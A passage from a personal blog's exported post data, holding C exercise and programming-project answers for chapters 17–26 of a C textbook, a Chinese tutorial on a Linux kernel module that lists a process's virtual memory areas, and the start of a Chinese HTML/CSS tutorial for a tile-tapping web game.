switch (code) { case 'i': insert(); break; case 's': search(); break; case 'u': update(); break; case 'p': print(); break; case 'q': return 0; default: printf(\"Illegal code\\n\"); } printf(\"\\n\"); }} /********************************************************** * find_part: Looks up a part number in the inventory * * array. Returns the array index if the part * * number is found; otherwise, returns -1. * **********************************************************/int find_part(int number){ int i; for (i = 0; i &lt; num_parts; i++) if (inventory[i].number == number) return i; return -1;} /********************************************************** * insert: Prompts the user for information about a new * * part and then inserts the part into the * * database. Prints an error message and returns * * prematurely if the part already exists or the * * database is full. * **********************************************************/void insert(void){ int part_number; if (num_parts == MAX_PARTS) { printf(\"Database is full; can't add more parts.\\n\"); return; } printf(\"Enter part number: \"); scanf(\"%d\", &amp;part_number); if (find_part(part_number) &gt;= 0) { printf(\"Part already exists.\\n\"); return; } inventory[num_parts].number = part_number; printf(\"Enter part name: \"); read_line(inventory[num_parts].name, NAME_LEN); printf(\"Enter quantity on hand: \"); scanf(\"%d\", &amp;inventory[num_parts].on_hand); num_parts++;} /********************************************************** * search: Prompts the user to enter a part number, then * * looks up the part in the database. If the part * * exists, prints the name and quantity on hand; * * if not, prints an error message. * **********************************************************/void search(void){ int i, number; printf(\"Enter part number: \"); scanf(\"%d\", &amp;number); i = find_part(number); if (i &gt;= 0) { printf(\"Part name: %s\\n\", inventory[i].name); printf(\"Quantity on hand: %d\\n\", inventory[i].on_hand); } else printf(\"Part not found.\\n\");} /********************************************************** * update: Prompts the user to enter a part number. * * Prints an error message if the part doesn't * * exist; otherwise, prompts the user to enter * * change in quantity on hand and updates the * * database. * **********************************************************/void update(void){ int i, number, change; printf(\"Enter part number: \"); scanf(\"%d\", &amp;number); i = find_part(number); if (i &gt;= 0) { printf(\"Enter change in quantity on hand: \"); scanf(\"%d\", &amp;change); inventory[i].on_hand += change; } else printf(\"Part not found.\\n\");} /********************************************************** * print: Sorts the inventory array by part number, then * * prints a listing of all parts in the database, * * showing the part number, part name, and * * quantity on hand. * **********************************************************/void print(void){ int i; qsort(inventory, num_parts, sizeof(struct part), compare_parts); printf(\"Part Number Part Name \" \"Quantity on Hand\\n\"); for (i = 0; i &lt; num_parts; i++) printf(\"%7d %-25s%11d\\n\", inventory[i].number, inventory[i].name, inventory[i].on_hand);} int compare_parts(const void *p, const void *q){ return ((struct part *) p)-&gt;number - ((struct part *) q)-&gt;number;} Chapter 18Answers to Selected Exercises2. [was #2] (a) extern (b) static (c) extern and static (when applied to a local variable) 4. [was #4] If f has never been called previously, the value of f(10) will be 0. If f has been called five times previously, the value of f(10) will be 50, since j is incremented once per call. 8. [was #6; modified] (a) x is an array of ten pointers to functions. Each function takes an int argument and returns a character. (b) x is a function that returns a pointer to an array of five integers. (c) x is a function with no arguments that returns a pointer to a function with an int argument that returns a pointer to a float value. (d) x is a function with two arguments. The first argument is an integer, and the second is a pointer to a function with an int argument and no return value. x returns a pointer to a function with an int argument and no return value. (Although this example may seem artificially complex, the signal function—part of the standard C library—has exactly this prototype. See p. 632 for a discussion of signal.) 10. [was #8] (a) char *(*p)(char *); (b) void *f(struct t *p, long int n)(void); (c) void (*a[])(void) = {insert, search, update, print}; (d) struct t (*b[10])(int, int); 13. [was #10] (a), (c), and (d) are legal. (b) is illegal; the initializer for a variable with static storage duration must be a constant expression, and i * i doesn’t qualify. 15. [was #12] (a). Variables with static storage duration are initialized to zero by default; variables with automatic storage duration have no default initial value. Chapter 19Answers to Selected Exercises2. [was #2; modified] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"stack.h\" #define PUBLIC /* empty */#define PRIVATE static struct node { int data; struct node *next;}; PRIVATE struct node *top = NULL; PRIVATE void terminate(const char *message){ printf(\"%s\\n\", message); exit(EXIT_FAILURE);} PUBLIC void make_empty(void){ while (!is_empty()) pop();} PUBLIC bool is_empty(void){ return top == NULL;} PUBLIC bool is_full(void){ return false;} PUBLIC void push(int i){ struct node *new_node = malloc(sizeof(struct node)); if (new_node == NULL) terminate(\"Error in push: stack is full.\"); new_node-&gt;data = i; new_node-&gt;next = top; top = new_node;} PUBLIC int pop(void){ struct node *old_top; int i; if (is_empty()) terminate(\"Error in pop: stack is empty.\"); old_top = top; i = top-&gt;data; top = top-&gt;next; free(old_top); return i;} 4. [was #4; modified] (a) Contents of stack.c file: 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"stack.h\" static void terminate(const char *message){ printf(\"%s\\n\", message); exit(EXIT_FAILURE);} void make_empty(Stack *s){ s-&gt;top = 0;} bool is_empty(const Stack *s){ return s-&gt;top == 0;} bool is_full(const Stack *s){ return s-&gt;top == STACK_SIZE;} void push(Stack *s, int i){ if (is_full(s)) terminate(\"Error in push: stack is full.\"); s-&gt;contents[s-&gt;top++] = i;} int pop(Stack *s){ if (is_empty(s)) terminate(\"Error in pop: stack is empty.\"); return s-&gt;contents[--s-&gt;top];} (b) Contents of stack.h file: 12345678910111213141516171819#ifndef STACK_H#define STACK_H #include &lt;stdbool.h&gt; /* C99 only */ struct node { int data; struct node *next;}; typedef struct node *Stack; void make_empty(Stack *s);bool is_empty(const Stack *s);bool is_full(const Stack *s);void push(Stack *s, int i);int pop(Stack *s); #endif Contents of stack.c file: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"stack.h\" static void terminate(const char *message){ printf(\"%s\\n\", message); exit(EXIT_FAILURE);} void make_empty(Stack *s){ while (!is_empty(s)) pop(s);} bool is_empty(const Stack *s){ return *s == NULL;} bool is_full(const Stack *s){ return false;} void push(Stack *s, int i){ struct node *new_node = malloc(sizeof(struct node)); if (new_node == NULL) terminate(\"Error in push: stack is full.\"); new_node-&gt;data = i; new_node-&gt;next = *s; *s = new_node;} int pop(Stack *s){ struct node *old_top; int i; if (is_empty(s)) terminate(\"Error in pop: stack is empty.\"); old_top = *s; i = (*s)-&gt;data; *s = (*s)-&gt;next; free(old_top); return i;} Chapter 20Answers to Selected Exercises2. [was #2] To toggle a bit in a variable i, apply the exclusive-or operator (^) to i and a mask with a 1 bit in the desired position, then store the result back into i. To toggle bit 4, for example, use the statement 1i = i ^ 0x0010; or, more concisely, 1i ^= 0x0010; 4. [was #4] `` 1#define MK_COLOR(r,g,b) ((long) (b) &lt;&lt; 16 | (g) &lt;&lt; 8 | (r)) 6. [was #6; modified] (a) 123456789101112131415161718192021#include &lt;stdio.h&gt; unsigned short swap_bytes(unsigned short i); int main(void){ unsigned short i; printf(\"Enter a hexadecimal number (up to four digits): \"); scanf(\"%hx\", &amp;i); printf(\"Number with bytes swapped: %hx\\n\", swap_bytes(i)); return 0;} unsigned short swap_bytes(unsigned short i){ unsigned short high_byte = i &lt;&lt; 8; unsigned short low_byte = i &gt;&gt; 8; return high_byte | low_byte;} (b) 1234unsigned short swap_bytes(unsigned short i){ return i &lt;&lt; 8 | i &gt;&gt; 8;} 8. [was #8] (a) The value of ~0 is a number containing all 1 bits. Shifting this number to the left by n places yields a result of the form 1…10…0, where there are n 0 bits. Applying the ~ operator to that number yields a result of the form 0…01…1, where there are n 1 bits. (b) It returns a bit-field within i of length n starting at position m. Positions are assumed to be numbered starting from the rightmost bit, which is position 0. 14. [was #9] 12345struct IEEE_float { unsigned int fraction: 23; /* members may need to be reversed */ unsigned int exponent: 8; unsigned int sign: 1;}; Chapter 21Answers to Selected Exercises7. [was #4] (a) &lt;time.h&gt; (b) &lt;ctype.h&gt; (c) &lt;limits.h&gt; (d) &lt;math.h&gt; (e) &lt;limits.h&gt; (f) &lt;float.h&gt; (g) &lt;string.h&gt; (h) &lt;stdio.h&gt; Chapter 22Answers to Selected Exercises2. [was #2] (a) \"rb+\" (b) \"a\" (c) \"rb\" (d) \"r\" 4. [was #4] (a) 00000083.736 (b) 00000029749. (c) 001.0549e+09 (d) 002.3522e-05 6. [was #6] printf(widget == 1 ? \"%d widget\" : \"%d widgets\", widget); 8. [was #8] No. The difference is that \"%1s\" will store a null character after it reads and stores a nonblank character; \" %c\" will store only the nonblank character. As a result, the two format strings must be used differently: 123456char c, s[2]; scanf(\" %c\", &amp;c); /* stores a nonblank character into c */scanf(\"%1s\", s); /* stores a nonblank character into s[0] and a null character into s[1] */ 10. [was #10] Revise the program’s while loop as follows: 12345while ((ch = getc(source_fp)) != EOF) if (putc(ch, dest_fp) == EOF) { fprintf(stderr, \"Error during writing; copy terminated\\n\"); exit(EXIT_FAILURE); } 14. [was #18] (a) 123456789101112131415161718char *fget_string(char *s, int n, FILE *stream){ int ch, len = 0; while (len &lt; n - 1) { if ((ch = getc(stream)) == EOF) { if (len == 0 || ferror(stream)) return NULL; break; } s[len++] = ch; if (ch == '\\n') break; } s[len] = '\\0'; return s;} (b) 12345678910int fput_string(const char *s, FILE *stream){ while (*s != '\\0') { if (putc(*s, stream) == EOF) return EOF; s++; } return 0;} 15. [was #22] (a) fseek(fp, n * 64L, SEEK_SET); (b) fseek(fp, -64L, SEEK_END); (c) fseek(fp, 64L, SEEK_CUR); (d) fseek(fp, -128L, SEEK_CUR); Answers to Selected Programming Projects2. [was #12] 12345678910111213141516171819202122232425#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ FILE *fp; int ch; if (argc != 2) { fprintf(stderr, \"usage: toupper file\\n\"); exit(EXIT_FAILURE); } if ((fp = fopen(argv[1], \"r\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[1]); exit(EXIT_FAILURE); } while ((ch = getc(fp)) != EOF) putchar(toupper(ch)); fclose(fp); return 0;} 4. [was #14] (a) 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ FILE *fp; int count = 0; if (argc != 2) { fprintf(stderr, \"usage: cntchar file\\n\"); exit(EXIT_FAILURE); } if ((fp = fopen(argv[1], \"r\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[1]); exit(EXIT_FAILURE); } while (getc(fp) != EOF) count++; printf(\"There are %d characters in %s\\n\", count, argv[1]); fclose(fp); return 0;} (b) 1234567891011121314151617181920212223242526272829303132333435#include &lt;ctype.h&gt;#include &lt;stdbool.h&gt; /* C99 only */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ FILE *fp; int ch, count = 0; bool in_word; if (argc != 2) { fprintf(stderr, \"usage: cntword file\\n\"); exit(EXIT_FAILURE); } if ((fp = fopen(argv[1], \"r\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[1]); exit(EXIT_FAILURE); } in_word = false; while ((ch = getc(fp)) != EOF) if (isspace(ch)) in_word = false; else if (!in_word) { in_word = true; count++; } printf(\"There are %d words in %s\\n\", count, argv[1]); fclose(fp); return 0;} (c) 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ FILE *fp; int ch, count = 0; if (argc != 2) { fprintf(stderr, \"usage: cntline file\\n\"); exit(EXIT_FAILURE); } if ((fp = fopen(argv[1], \"r\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[1]); exit(EXIT_FAILURE); } while((ch = getc(fp)) != EOF) if (ch == '\\n') count++; printf(\"There are %d lines in %s\\n\", count, argv[1]); fclose(fp); return 0;} 6. [was #16; modified] 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ FILE *fp; int i, n, offset; unsigned char buffer[10]; if (argc != 2) { fprintf(stderr, \"usage: viewfile file\\n\"); exit(EXIT_FAILURE); } if ((fp = fopen(argv[1], \"rb\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[1]); exit(EXIT_FAILURE); } printf(\"Offset Bytes Characters\\n\"); printf(\"------ ----------------------------- ----------\\n\"); for (offset = 0;; offset += 10) { n = fread(buffer, 1, 10, fp); if (n == 0) break; printf(\"%6d \", offset); for (i = 0; i &lt; n; i++) printf(\"%.2X \", buffer[i]); for (; i &lt; 10; i++) printf(\" \"); printf(\" \"); for (i = 0; i &lt; n; i++) { if (!isprint(buffer[i])) buffer[i] = '.'; printf(\"%c\", buffer[i]); } printf(\"\\n\"); } fclose(fp); return 0;} 9. [was #20] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; #define NAME_LEN 25 struct part { int number; char name[NAME_LEN + 1]; int on_hand;}; int main(int argc, char *argv[]){ FILE *in_fp1, *in_fp2, *out_fp; int num_read1, num_read2; struct part part1, part2; if (argc != 4) { fprintf(stderr, \"usage: merge infile1 infile2 outfile\\n\"); exit(EXIT_FAILURE); } if ((in_fp1 = fopen(argv[1], \"rb\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[1]); exit(EXIT_FAILURE); } if ((in_fp2 = fopen(argv[2], \"rb\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[2]); exit(EXIT_FAILURE); } if ((out_fp = fopen(argv[3], \"wb\")) == NULL) { fprintf(stderr, \"Can't open %s\\n\", argv[3]); exit(EXIT_FAILURE); } num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1); num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2); while (num_read1 == 1 &amp;&amp; num_read2 == 1) /* successfully read records from both files */ if (part1.number &lt; part2.number) { fwrite(&amp;part1, sizeof(struct part), 1, out_fp); num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1); } else if (part1.number &gt; part2.number) { fwrite(&amp;part2, sizeof(struct part), 1, out_fp); num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2); } else { /* part numbers are equal */ if (strcmp(part1.name, part2.name) != 0) fprintf(stderr, \"Names don't match for part %d; using the name %s\\n\", part1.number, part1.name); part1.on_hand += part2.on_hand; fwrite(&amp;part1, sizeof(struct part), 1, out_fp); num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1); num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2); } /* copy rest of file1 to output file */ while (num_read1 == 1) { fwrite(&amp;part1, sizeof(struct part), 1, out_fp); num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1); } /* copy rest of file2 to output file */ while (num_read2 == 1) { fwrite(&amp;part2, sizeof(struct part), 1, out_fp); num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2); } fclose(in_fp1); fclose(in_fp2); fclose(out_fp); return 0;} Chapter 23Answers to Selected Exercises1. [was #2; modified] 123456789double round_nearest(double x, int n){ double power = pow(10.0, n); if (x &lt; 0.0) return ceil(x * power - 0.5) / power; else return floor(x * power + 0.5) / power;} 6. [was #6] (a) memmove (b) memmove (we can’t use strcpy because its behavior is undefined when the source of the copy overlaps with the destination) (c) strncpy (d) memcpy 8. [was #8] 123456789101112int numchar(const char *s, char ch){ int count = 0; s = strchr(s, ch); while (s != NULL) { count++; s = strchr(s + 1, ch); } return count;} 10. [was #10] 1if (strstr(\"foo#bar#baz\", str) != NULL) … The assumptions are that str is at least three characters long and doesn’t contain the # character. 11. [was #12] memset(&amp;s[strlen(s)-n], '!', n); Answers to Selected Programming Projects2. [was #4; modified] 12345678910111213141516171819202122#include &lt;ctype.h&gt;#include &lt;stdbool.h&gt; /* C99 only */#include &lt;stdio.h&gt; int main(void){ bool nonblank_seen = false; int ch; while ((ch = getchar()) != EOF) { if (nonblank_seen) putchar(ch); else if (!isspace(ch)) { nonblank_seen = true; putchar(ch); } if (ch == '\\n') nonblank_seen = false; } return 0;} Chapter 24Answers to Selected Exercises4. [was #2] (a) 123456789101112double try_math_fcn(double (*f)(double), double x, const char *msg){ double result; errno = 0; result = (*f)(x); if (errno != 0) { perror(msg); exit(EXIT_FAILURE); } return result;} (b) 1#define TRY_MATH_FCN(f,x) try_math_fcn(f, x, \"Error in call of \" #f) 5. [was #4] 12345678910111213141516171819202122232425int main(void){ char code; for (;;) { setjmp(env); printf(\"Enter operation code: \"); scanf(\" %c\", &amp;code); while (getchar() != '\\n') /* skips to end of line */ ; switch (code) { case 'i': insert(); break; case 's': search(); break; case 'u': update(); break; case 'p': print(); break; case 'q': return 0; default: printf(\"Illegal code\\n\"); } printf(\"\\n\"); }} The jmp_buf variable env will need to be global, rather than local to main, so that the function performing the longjmp will be able to supply it as an argument. Chapter 25Answers to Selected Exercises6. [was #4; modified] 1234567while ((orig_char = getchar()) != EOF) ??&lt; new_char = orig_char ??' KEY; if (isprint(orig_char) &amp;&amp; isprint(new_char)) putchar(new_char); else putchar(orig_char);??&gt; Answers to Selected Programming Projects1. [was #2] 12345678910111213141516171819202122232425262728293031323334353637#include &lt;locale.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; int main(void){ char *temp, *C_locale; temp = setlocale(LC_ALL, NULL); /* \"C\" is the current locale by default */ if (temp == NULL) { printf(\"\\\"C\\\" locale information not available\\n\"); exit(EXIT_FAILURE); } C_locale = malloc(strlen(temp) + 1); if (C_locale == NULL) { printf(\"Can't allocate space to store locale information\\n\"); exit(EXIT_FAILURE); } strcpy(C_locale, temp); temp = setlocale(LC_ALL, \"\"); if (temp == NULL) { printf(\"Native locale information not available\\n\"); exit(EXIT_FAILURE); } if (strcmp(temp, C_locale) == 0) printf(\"Native locale is the same as the \\\"C\\\" locale\\n\"); else printf(\"Native locale is not the same as the \\\"C\\\" locale\\n\"); return 0;} Chapter 26Answers to Selected Exercises2. [was #2] 123456789101112131415161718192021222324252627282930313233343536373839void int_printf(const char *format, ...){ va_list ap; const char *p; int digit, i, power, temp; va_start(ap, format); for (p = format; *p != '\\0'; p++) { if (*p != '%') { putchar(*p); continue; } if (*++p == 'd') { i = va_arg(ap, int); if (i &lt; 0) { i = -i; putchar('-'); } temp = i; power = 1; while (temp &gt; 9) { temp /= 10; power *= 10; } do { digit = i / power; putchar(digit + '0'); i -= digit * power; power /= 10; } while (i &gt; 0); } } va_end(ap);} 7. [was #4] The statement converts the string that p points to into a long integer, storing the result in value. p is left pointing to the first character not included in the conversion. The base used for the conversion is 10. 9. [was #6] 1234double rand_double(void){ return (double) rand() / (RAND_MAX + 1);} Answers to Selected Programming Projects1. [was #8] (a) 123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(void){ int count = 1000; while (count-- &gt; 0) printf(\"%d\", rand() &amp; 1); printf(\"\\n\"); return 0;} (b) For generating numbers in the range 0 to N - 1, the formula rand() / (RAND_MAX / N + 1) often gives better results than rand() % N. For example, if N is 2 and RAND_MAX is 32767, the formula works out to rand() / 16384, which yields 0 if the return value of rand is less than 16384 and 1 if it’s greater than or equal to 16384. 3. [was #10; modified] 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt; #define N 1000 int compare_ints(const void *p, const void *q); int main(void){ int a[N], i; clock_t start_clock; for (i = 0; i &lt; N; i++) a[i] = N - i; start_clock = clock(); qsort(a, N, sizeof(a[0]), compare_ints); printf(\"Time used to sort %d integers: %g sec.\\n\", N, (clock() - start_clock) / (double) CLOCKS_PER_SEC); return 0;} int compare_ints(const void *p, const void *q){ return *(int *)p - *(int *)q;} 4. [was #12] 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;time.h&gt; int main(void){ struct tm t; int n; /* initialize unused members */ t.tm_sec = t.tm_min = t.tm_hour = 0; t.tm_isdst = -1; printf(\"Enter month (1-12): \"); scanf(\"%d\", &amp;t.tm_mon); t.tm_mon--; printf(\"Enter day (1-31): \"); scanf(\"%d\", &amp;t.tm_mday); printf(\"Enter year: \"); scanf(\"%d\", &amp;t.tm_year); t.tm_year -= 1900; printf(\"Enter number of days in future: \"); scanf(\"%d\", &amp;n); t.tm_mday += n; mktime(&amp;t); printf(\"\\nFuture date: %d/%d/%d\\n\", t.tm_mon + 1, t.tm_mday, t.tm_year + 1900); return 0;} 6. [was #14] (a) 123456789101112131415#include &lt;stdio.h&gt;#include &lt;time.h&gt; int main(void){ time_t current = time(NULL); struct tm *ptr; char date_time[37]; ptr = localtime(&amp;current); strftime(date_time, sizeof(date_time), \"%A, %B %d, %Y %I:%M\", ptr); printf(\"%s%c\\n\", date_time, ptr-&gt;tm_hour &lt;= 11 ? 'a' : 'p'); return 0;} (b) 1234567891011121314#include &lt;stdio.h&gt;#include &lt;time.h&gt; int main(void){ time_t current = time(NULL); char date_time[22]; strftime(date_time, sizeof(date_time), \"%a, %d %b %y %H:%M\", localtime(&amp;current)); puts(date_time); return 0;} (c) 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;time.h&gt; int main(void){ time_t current = time(NULL); struct tm *ptr; char date[9], time[12]; ptr = localtime(&amp;current); strftime(date, sizeof(date), \"%m/%d/%y\", ptr); strftime(time, sizeof(time), \"%I:%M:%S %p\", ptr); /* print date and time, suppressing leading zero in hours */ printf(\"%s %s\\n\", date, time[0] == '0' ? &amp;time[1] : time); return 0;}","categories":[],"tags":[{"name":"C语言","slug":"C语言","permalink":"https://czqu.net/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"答案","slug":"答案","permalink":"https://czqu.net/tags/%E7%AD%94%E6%A1%88/"}]},{"title":"Linux内存管理","slug":"draft/Linux-memory-Manage","date":"2020-11-13T04:27:41.000Z","updated":"2020-11-13T04:27:41.000Z","comments":true,"path":"posts/53930/","permalink":"https://czqu.net/posts/53930/","excerpt":"","text":"前言： 在 32 位的系统上，线性地址空间为 4GB，其中用户进程占有 3GB 线性地址空间，内核占有 1GB 线性地址空间。由于虚拟内存的引入，使的每个进程都可拥有 3GB 的虚拟内存。 用户进程的虚拟地址空间包含若干区域，这些区域的分布方式因体系结构的差异而不同，但所有的方式都包含下列成分： （1） 代码段：可执行文件的二进制代码 （2） 数据段：存储全局变量 （3） 栈：用于保存局部变量和实现函数调用 （4） 环境变量和命令行参数 （5） 程序使用的动态库的代码 （6） 用于映射文件内容的区域为便于描述，系统中进程的虚拟内存空间被划分为若干不同的区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在 Linux 内核中，这样的区域被称为虚拟内存区域(virtual memory areas，VMA)。一个 VMA 是一块连续的线性地址空间的抽象，它拥有自身的权限(可读，可写，可执行等) ，对进程而言，VMA 其实是虚拟空间的内存块，一个进程的所有资源由多个内存块组成。 每一个虚拟内存区域都由一个相关的 struct vm_area_struct 结构来描述。 本文将编写一个内核模块，遍历一个用户进程中所有的 VMA，并且打印这些 VMA 的属性信息，如 VMA 的大小、起始地址等，并通过与“/proc/pid/maps”中显示的信息进行对比验证 VMA 信息是否正确。 编写模块程序参考代码如下，代码文件命名为“vma_test.c” 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//vma_test.c#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/mm.h&gt;#include &lt;linux/sched.h&gt;static int pid;module_param(pid, int, 0644);static void printit(struct task_struct *tsk){ struct mm_struct *mm; struct vm_area_struct *vma; int j = 0; unsigned long start, end, length; mm = tsk-&gt;mm; pr_info(\"mm_struct addr = 0x%p\\n\", mm); vma = mm-&gt;mmap; /* 使用 mmap_sem 读写信号量进行保护 */ down_read(&amp;mm-&gt;mmap_sem); pr_info(\"vmas: vma start end length\\n\"); while (vma) { j++; start = vma-&gt;vm_start; end = vma-&gt;vm_end; length = end - start; pr_info(\"%6d: %16p %12lx %12lx %8ld\\n\", j, vma, start, end, length); vma = vma-&gt;vm_next; } up_read(&amp;mm-&gt;mmap_sem);}static int __init vma_init(void){ struct task_struct *tsk; /* 如果插入模块时未定义 pid 号，则使用当前 pid */ if (pid == 0) { tsk = current; pid = current-&gt;pid; pr_info(\"using current process\\n\"); } else { tsk = pid_task(find_vpid(pid), PIDTYPE_PID); } if (!tsk) return -1; pr_info(\" Examining vma's for pid=%d, command=%s\\n\", pid, tsk-&gt;comm); printit(tsk); return 0;}static void __exit vma_exit(void){ pr_info(\"Module exit\\n\");}module_init(vma_init);module_exit(vma_exit);MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"Mr Yu\");MODULE_DESCRIPTION(\"vma test\"); 以上代码中: 38-52 行是内核模块初始化函数 vma_init； 40-46 行目的是获取 pid，可在加载模块时可传递相关参数（即进程 pid）；如果没有传递参数，则使用当前进程，即执行 insmod 命令的进程； 45 行 pid_task()函数为获取任务的任务描述符信息，其返回值是 struct task_struct 结构体类型的变量； 50 行调用自定义的 printit()函数打印相关信息； 9-34 行是本实验核心函数； 16 行获取待检查进程的内存描述符 struct mm_struct 数据结构，该结构由struct task_struct 中的*mm 指向； 18 行获取 VMA 链表头，即 mm-&gt;mmap； 21 行开始遍历 VMA 链表,down_read()函数用于申请读信号量，因本程序只是读取 VMA 链表，所以申请读者类型即可，若需丢 VMA 链表进行修改，则需申请写者类型信号量； 24-32 行遍历 VMA 链表，并对每个 VMA 打印其起始地址、终止地址和长度信息； 33 行释放读者信号量。 编译内核模块编写 Makefile 文件，文件名必须为“Makefile” 12345678910obj-m := vma_test.oKERNELBUILD := /lib/modules/$(shell uname -r)/buildCURRENT_PATH := $(shell pwd)all: make -C $(KERNELBUILD) M=$(CURRENT_PATH) modulesclean: make -C $(KERNELBUILD) M=$(CURRENT_PATH) clean 编译使用 make 命令编译即可。 插入模块先通过 top 命令查看进程，任意获取一个进程 pid，如图所示， 本例中获取apache2 进程的 pid 3509。 使 用 insmod 插 入 模 块 ， 并 传 参 。 如 图 所 示 ， 本 例 中 模 块 名 为“vma_test.ko”,pid 为 3509，则插入模块命令为： 1insmod vma_test.ko pid=3509 查看程序打印信息通过 dmesg 命令查看 VMA 信息。如下图所示: 从上图可看到 apache2 进程包含许多 VMA 区域，以第一个 VMA 区域为例，其起始地址为 0x564af2e3a000,结束地址为 564af2ed7000,长度为 643072 字节。 ​ 如下图所示为从 proc 虚拟文件系统中查看相应进程第一个 VMA 的完整信息。 从以上两图中内容对比可知，本程序输出信息正确。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"}]},{"title":"h5别踩白块游戏","slug":"release/2020-11-5-Do-not-Tap-The-White-Tile","date":"2020-11-05T07:01:00.000Z","updated":"2020-11-05T07:01:00.000Z","comments":true,"path":"posts/59750/","permalink":"https://czqu.net/posts/59750/","excerpt":"","text":"内容介绍1.简介别踩白块这个游戏相信很多人都在手机上玩过，今天我们就来做一个网页版的，先上一张游戏效果图： 属于简化版别踩白块，代码相对较为简单易学，主要涉及通过 javascript 操作元素节点的增删以及属性节点（class）的操作。 2.知识点 HTML/CSS JavaScript 元素节点增删 属性节点操作 3.项目架构1234puzzle |index.html |css/index.css |js/index.js 项目原理在开始编程之前，让我们先来分析下整个游戏的流程：一定的速度下移，点击黑块，黑块消失，新的黑块出现在普通游戏玩家眼中，应该是游戏开始，黑块不断向下移动，若黑块触底则游戏结束； 而以开发者来说，应将每一个黑块和白块抽象成一个个的数据结构，黑块的消失和出现其实就是数据结构的创造和销毁，我们来看一张游戏的流程图，对于要编写的功能有一个大概的了解: 实现步骤页面布局可以用 div+css 布局来实现别踩白块的静态效果展示，直接上 HTML 代码，我来简要说下 HTML 思路，将主界面分解成一个 4x4 的大矩形格子，每一个方块代表其中一个小的矩形格，其中每一行的四个白块中有一个黑块，每一行中黑块位于哪一列是随机生成的，但是我们这里现在是静态页面就自己确定了，然后通过 css 控制样式。 创建 index.html 文件，并输入以下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;别踩白块&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/index.css\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"main\"&gt; &lt;div id=\"con\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; /*白块*/ &lt;div class=\"cell black\"&gt;&lt;/div&gt; /*黑块*/ &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell black\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell black\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"cell black\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;div class=\"cell\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script src=\"js/index.js\"&gt;&lt;/script&gt;&lt;/html&gt; 添加样式下面是 css 代码，这里有一个要注意的地方，我将 div#con 块级元素向上提了 100 px，这样在游戏的开始就出现了最底一行的空白，隐藏最上面那行，为什么要这样呢，继续往下看就知道了。设置黑白块的样式，为 js 部分动态插入黑白块做准备。 创建 css/index.css 文件，并输入以下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#main { width: 408px; height: 408px; background: white; border: 2px solid gray; margin: 0 auto; overflow: 